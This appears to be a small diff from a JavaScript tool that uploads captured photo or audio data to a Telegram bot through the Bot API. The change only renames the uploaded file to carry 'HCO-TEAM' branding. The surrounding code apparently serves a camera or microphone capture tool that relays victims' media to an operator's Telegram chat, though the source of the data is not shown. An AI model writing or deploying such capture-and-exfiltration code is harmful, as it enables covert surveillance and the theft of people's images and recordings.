@@ -251,7 +251,7 @@
 
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@HCO-TEAM.${type === 'photo' ? 'jpg' : 'wav'}`);
 
       fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
         method: 'POST',
